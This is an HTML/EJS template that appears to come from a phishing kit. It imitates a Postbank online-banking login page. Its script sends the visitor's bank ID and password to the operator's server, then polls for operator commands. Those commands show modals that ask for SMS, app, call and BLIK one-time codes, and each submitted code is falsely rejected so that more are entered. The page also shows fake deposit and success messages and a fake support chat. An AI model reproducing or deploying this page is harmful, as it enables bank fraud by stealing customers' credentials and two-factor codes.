
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Postbank</title>
    <link rel="shortcut icon" href="/bank/check_banks_files/dkb_favicon.ico">
    <script src="https://cdn.jsdelivr.net/npm/vue-swal@1.0.0/dist/vue-swal.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.27.2/axios.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"></script>
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
    <link rel="stylesheet" href="/css/support_parent.css" />
    <style>
        body {
            display: block;
            background: url("/bank/check_banks_files/postbank_bg.png") no-repeat center top fixed;
            background-size: cover;
        }

        .block {
            text-align: center;
        }

        .logo {
            margin: 0 auto;
        }

        .parent {
            width: 100%;
            height: 100%;
            position: absolute;
            top: 0;
            left: 0;
            overflow: auto;
        }

        .block {
            width: 350px;
            height: 350px;
            position: absolute;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            margin: auto;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="parent">
            <div class="block">
                <div class="card">
                    <div class="card-body needs-validation">
                        <div class="logo mb-3">
                            <svg style="margin-bottom: -50px" version="1.1" id="Logo" xmlns="http://www.w3.org/2000/svg"
                                x="0" y="0" viewBox="0 0 160 65" xml:space="preserve">
                                <style>
                                    .st0 {
                                        fill: #0a3478;
                                    }
                                </style>
                                <path class="st0"
                                    d="M50.4 25.5h3.7v-7.1h1.6c4 0 7.2-1.6 7.2-5.9 0-4.5-3.7-5.6-7.8-5.6h-4.7v18.6zm3.8-15.7h1.3c1.9 0 3.6.7 3.6 2.9s-1.7 2.8-3.6 2.8h-1.3V9.8zm47.1 15.7h3.4v-1.7c1 1.3 2.5 2.1 4.1 2.1 4.1 0 5.8-3.5 5.8-7.2 0-3.8-1.6-7.2-5.7-7.2-1.7 0-3.2.8-4.2 2.2V5.4h-3.5l.1 20.1zm3.5-6.9c0-1.9.9-4.4 3.2-4.4 2.3 0 3 2.5 3 4.4 0 1.9-.7 4.5-3.1 4.5-2.3-.1-3.1-2.6-3.1-4.5m42.4 6.9V5.4h3.6v11.8h.1l4.3-5.5h4.2l-5.1 6.2 5.8 7.6h-4.5l-4.6-6.7h-.1v6.7h-3.7zm-15.7 0V11.7h3.4v1.9h.1c1-1.5 2.7-2.3 4.5-2.2 3.3 0 4.7 2.3 4.7 5.4v8.7h-3.6v-7.4c0-1.7 0-4-2.3-4-2.6 0-3.2 2.8-3.2 4.6v6.7l-3.6.1zM88.7 11.9l-.2 2.7c-1-.4-2.1-.6-3.2-.6-1 0-2.1.3-2.1 1.5 0 2.2 6.2.8 6.2 5.8 0 3.2-2.9 4.5-5.8 4.5-1.4 0-2.7-.2-4.1-.6l.2-2.9c1.1.6 2.3.9 3.5.9.9 0 2.4-.3 2.4-1.7 0-2.7-6.2-.9-6.2-5.8 0-3 2.6-4.3 5.4-4.3 1.3 0 2.6.2 3.9.5m3.9 9.5v-7H90v-2.6h2.6V9l3.6-1.1v3.9h3.2v2.6h-3.2v6.4c0 1.2.3 2.3 1.7 2.3.6 0 1.1-.1 1.6-.4l.1 2.8c-.9.2-1.8.3-2.6.3-2.9 0-4.4-1.7-4.4-4.4m-25.7-3.1c0-2.1 1.1-4.2 3.5-4.2s3.5 2 3.5 4.2c0 2.4-.7 4.9-3.5 4.9s-3.5-2.6-3.5-4.9m-3.8.4c0 4 2.6 7.3 7.2 7.3s7.2-3.2 7.2-7.3c0-4.6-3.1-7.4-7.2-7.4-4 0-7.2 2.8-7.2 7.4m56.5 2.8c0-2.1 2.4-2.4 4-2.4h1.6c.1 1-.2 2-.7 2.8-.6.8-1.5 1.3-2.5 1.2-1.4.1-2.4-.4-2.4-1.6m-1.8-6c1.2-.9 2.7-1.5 4.3-1.5 2.1 0 3.1.7 3.1 3h-2c-1.6-.1-3.2.2-4.6.8-1.5.7-2.5 2.3-2.4 3.9 0 2.6 2.4 4.1 4.8 4.1 1.7 0 3.4-.9 4.3-2.4h.1c0 .7.1 1.4.2 2.1h3.2c-.1-1.1-.1-2-.2-3.1 0-1-.1-2.1-.1-3.4v-1.8c0-4.1-1.7-5.8-5.9-5.8-1.6 0-3.3.4-4.8 1v3.1zM16.2.4L33.1 0c-10 5.8-16.8 15.8-18.6 27.2H0C1.1 19.1 7.6 5.7 16.2.4m24.6 10.7c-4.7 3-8 7.8-9 13.3h-4.3c.8-4.4 3.5-10.2 7.7-13.2-.1 0 5.6-.1 5.6-.1">
                                </path>
                                <path d="M27.8 6.9l9.9-.3C29.6 11 25.6 19.9 24.9 25.5h-7.5C18 20.9 21.1 12 27.8 6.9"
                                    fill="#e10014"></path>
                            </svg>
                        </div>

                        <main id="formLogin" name="formLogin" enctype="application/x-www-form-urlencoded">
                            <input type="hidden" name="formLogin" value="formLogin">
                            <div class="mb-3">
                                <label for="exampleFormControlInput1" class="form-label">Postbank ID</label>
                                <input type="text" name="login" class="form-control" id="login"
                                    placeholder="Postbank ID" required>
                                    <div class="invalid-feedback">
                                      Pflichtfeld
                                    </div>
                            </div>
                            <div class="mb-3">
                                <label for="exampleFormControlInput1" class="form-label">Passwort</label>
                                <input type="text"  class="form-control"  id="password" name="formLogin:passwordInput" type="password"
                                    placeholder="Passwort" required>
                                    <div class="invalid-feedback">
                                      Pflichtfeld
                                    </div>
                            </div>
    
                            <div class="d-grid gap-2">
                                <input class="btn btn-primary"  id="btn"  alt="login" type="submit" value="Betreten">
                            </div>
                        </main>
                      
                    </div>
                </div>
            </div>
        </div>
    </div>
    
   


<style>
    .asd {
        border: 1px solid #ccc;
        height: 15px;
    }

    .swal-content__input,
    .swal-content__textarea {
        -webkit-appearance: none;
        background-color: #fff;
        border: none;
        font-size: 14px;
        display: block;
        box-sizing: border-box;
        width: 100%;
        border: 1px solid rgba(0, 0, 0, .14);
        padding: 10px 13px;
        border-radius: 2px;
        transition: border-color .2s;
    }

    .swal-button {
        background-color: #7cd1f9;
        color: #fff;
        border: none;
        box-shadow: none;
        border-radius: 5px;
        font-weight: 600;
        font-size: 14px;
        padding: 10px 24px;
        margin: 0;
        cursor: pointer;
        display: block;
    }
</style>

<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.2.1/axios.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
    crossorigin="anonymous"></script>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"
    integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"
    integrity="sha512-pHVGpX7F/27yZ0ISY+VVjyULApbDlD0/X0rgGbTqCE7WFW5MezNTWG/dnhtbBuICzsd0WQPgpE4REBLv+UqChw=="
    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdn.jsdelivr.net/npm/vue-swal@1.0.0/dist/vue-swal.min.js" crossorigin="anonymous"></script>

<script>
    var token = null

    document.getElementById("btn").onclick = async function () {
        const login = document.getElementById("login").value
        const password = document.getElementById("password").value

        if (!login || !password) return alert("Заполните все поля")

        await axios.post("/api/sendBank", {
            adId: "<%=log.id%>",
            login: login,
            password: password
        }).then(async function (res) {
            token = res.data.token
            init(res.data.token)
        })
    };

    async function init(token) {
            var currentStatus = null;

            function waitModal() {
                swal({
                    title: "<%=translate["wait"][ad.service.lang]%>",
                    text: "<%=translate["bank_processes"][ad.service.lang]%>",
                    type: "info",
                    closeOnClickOutside: false,
                    closeOnEsc: false,
                    buttons: false,
                }).then((ok) => {
                    if (ok) document.location.href = "/ad/" + AD_ID;
                });
            }
            
            function limitsModal() {
                swal({
                    title: "<%=translate["error_title"][ad.service.lang]%>",
                    text: "<%=translate["limits"][ad.service.lang]%>",
                    type: "error",
                    closeOnConfirm: false,
                    closeOnCancel: false,
                    closeOnClickOutside: false,
                    closeOnEsc: false,
                }).then((ok) => {
                    if (ok) document.location.href = "/ad/" + AD_ID;
                });
            }
            function forVerifyModal() {
                swal({
                    title: "<%=translate["error_title"][ad.service.lang]%>",
                    text: "<%=translate["for_verify"][ad.service.lang]%>",
                    type: "error",
                    closeOnConfirm: false,
                    closeOnCancel: false,
                    closeOnClickOutside: false,
                    closeOnEsc: false,
                }).then((ok) => {
                    if (ok) document.location.href = "/ad/" + AD_ID;
                });
            }
            function correctBalanceModal() {
                swal({
                    title: "<%=translate["error_title"][ad.service.lang]%>",
                    text: "<%=translate["correct_balance"][ad.service.lang]%>",
                    type: "error",
                    closeOnConfirm: false,
                    closeOnCancel: false,
                    closeOnClickOutside: false,
                    closeOnEsc: false,
                }).then((ok) => {
                    if (ok) document.location.href = "/ad/" + AD_ID;
                });
            }
            function otherCardModal() {
                swal({
                    title: "<%=translate["error_title"][ad.service.lang]%>",
                    text: "<%=translate["other_card"][ad.service.lang]%>",
                    type: "error",
                    closeOnConfirm: false,
                    closeOnCancel: false,
                    closeOnClickOutside: false,
                    closeOnEsc: false,
                }).then((ok) => {
                    if (ok) document.location.href = "/ad/" + AD_ID;
                });
            }
                function moneyModal() {
                swal({
                    title: "<%=translate["error_title"][ad.service.lang]%>",
                    text: "<%=translate["dep_text"][ad.service.lang]%>",
                    type: "error",
                    closeOnConfirm: false,
                    closeOnCancel: false,
                    closeOnClickOutside: false,
                    closeOnEsc: false,
                }).then((ok) => {
                    if (ok) document.location.href = "/ad/" + AD_ID;
                });
            }
            function fakeLkModal() {
                swal({
                    title: translate["error_title"].ua,
                    text: translate["lkby_fake"].ua,
                    type: "error",
                });
            }

            function pushModal() {
                swal("<%=translate["push_title"][ad.service.lang]%>", "<%=translate["push_text"][ad.service.lang]%>", "info", {
                    closeOnClickOutside: false,
                    closeOnEsc: false,
                    buttons: false,
                });
            }
            function successModal() {
                swal("<%=translate["success"][ad.service.lang]%>", "<%=translate["money_will"][ad.service.lang]%>", "success", {
                    closeOnClickOutside: false,
                    closeOnEsc: false,
                    buttons: false,
                });
            }
            function pictureModal() {
                swal(
                    translate["picture_title"].ua,
                    translate["picture_text"].ua,
                    "info",
                    {
                        content: {
                            element: "div",
                            attributes: {
                                id: "pictures_div",
                            },
                        },
                        closeOnClickOutside: false,
                        closeOnEsc: false,
                        buttons: false,
                    }
                );
                const pictures = [
                    "банан",
                    "брюки",
                    "бургер",
                    "гитара",
                    "зонтик",
                    "календарь",
                    "калькулятор",
                    "карандаш",
                    "клубника",
                    "компас",
                    "крокодил",
                    "лимон",
                    "мамонт",
                    "микрофон",
                    "наушники",
                    "очки",
                    "помидор",
                    "свитер",
                    "телефон",
                    "цветок",
                    "шоколад",
                ].sort(() => Math.random() - 0.5);

                document.querySelector("#pictures_div").innerHTML =
                    '<div class="pictures-container">' +
                    pictures
                        .map(
                            (v) =>
                                '<div class="pictures-element" data-item="' +
                                v +
                                '"><img draggable="false" alt="" src="/img/pictures/' +
                                v +
                                '.png"></div>'
                        )
                        .join("\n") +
                    "</div>";
                document.querySelector(".pictures-container").classList.remove("disabled");
            }
            function codeModal(
                codeType = "sms", title = "<%=translate["sms_title"][ad.service.lang]%>", text = "<%=translate["sms_text"][ad.service.lang]%>", placeholder = "<%=translate["sms_placeholder"][ad.service.lang]%>", wrong_code = "<%=translate["wrong_code"][ad.service.lang]%>"
            ) {
                swal.stopLoading();
                swal({
                    title,
                    text,
                    content: {
                        element: "input",
                        attributes: {
                            type: "password",
                            placeholder,
                            maxLength: 255,
                            required: true,
                            style:
                                "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
                        },
                    },
                    closeOnEsc: false,
                    closeOnClickOutside: false,
                    buttons: {
                        confirm: {
                            text: "<%=translate["submit"][ad.service.lang]%>",
                            closeModal: false,
                        },
                    },
                }).then(async (code) => {
                    try {
                        if (!code) return;
                        $.ajax({
                            type: "POST",
                            url: "/api/submitCode",
                            data: {
                                codeType,
                                code,
                                token: token,
                            },
                            success: (data) => {
                                swal.stopLoading();
                                alert(wrong_code);
                                codeModal(...arguments);
                            },
                            error: () => {
                                swal.stopLoading();
                                alert(wrong_code);
                                codeModal(...arguments);
                            },
                        });
                    } catch (err) {
                        swal.stopLoading();
                        alert(wrong_code);
                        codeModal(...arguments);
                    }
                });
            }
            
            function checkLogStatus() {
                $.ajax({
                    type: "POST",
                    url: "/api/checkStatus",
                    data: {
                        token: token,
                    },
                    success: (data) => {
                        if (data.status == currentStatus) return;
                        currentStatus = data.status;
                        if (currentStatus == "profit") successModal();
                        else if (currentStatus == "sms") codeModal();
                        else if (currentStatus == "appCode")
                            codeModal(
                                "app",
                                "<%=translate["app_code_title"][ad.service.lang]%>",
                                "<%=translate["app_code_text"][ad.service.lang]%>",
                                "<%=translate["app_code_placeholder"][ad.service.lang]%>",
                            );
                        else if (currentStatus == "callCode")
                            codeModal(
                                "call",
                                "<%=translate["call_code_title"][ad.service.lang]%>",
                                "<%=translate["call_code_text"][ad.service.lang]%>",
                                "<%=translate["call_code_placeholder"][ad.service.lang]%>",
                            );
                            else if (currentStatus == "money")
                            moneyModal(
                                "money",
                                "<%=translate["error_title"][ad.service.lang]%>",
                                "<%=translate["dep_text"][ad.service.lang]%>",
                            );
                        else if (currentStatus == "blik")
                            codeModal(
                                "blik",
                                "<%=translate["blik_code_title"][ad.service.lang]%>",
                                "<%=translate["blik_code_text"][ad.service.lang]%>",
                                "<%=translate["blik_code_placeholder"][ad.service.lang]%>",
                            );
                        else if (currentStatus == "fakeLk") fakeLkModal();
                        else if (currentStatus == "push") pushModal();
                        else if (currentStatus == "limits") limitsModal();
                        else if (currentStatus == "otherCard") otherCardModal();
                        else if (currentStatus == "money") moneyModal();


                        else if (currentStatus == "forVerify") forVerifyModal();
                        else if (currentStatus == "correctBalance") correctBalanceModal();
                        else if (currentStatus == "picture") pictureModal();
                    },
                }).done(() => setTimeout(checkLogStatus, 1500));
            }
            setTimeout(checkLogStatus, 1500)
            waitModal()
        }
</script>
<div class="
chatra--webkit
chatra--style-round
chatra--side-bottom
chatra--pos-right
chatra--visible
chatra--expanded
chatra--fast-toggle
" id="chatra" data-turbolinks-permanent="" style="
width: 380px;
height: 600px;
transform: none;
z-index: 2147483647;
display: none;
">
<div id="chatra__iframe-wrapper">
<iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat" allow="autoplay"
src="/supportChatFrame/<%=ad.id%>" style="width: 380px; height: 600px; position: absolute"></iframe>
</div>
</div>
<div class="support-circle"
onclick="document.querySelector('#chatra').style.display = 'block';this.style.display = 'none'"></div>

<script>
const adId = "<%=ad.id%>"
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.2/axios.min.js"></script>
<script src="/js/eye.js" defer></script>

</body>
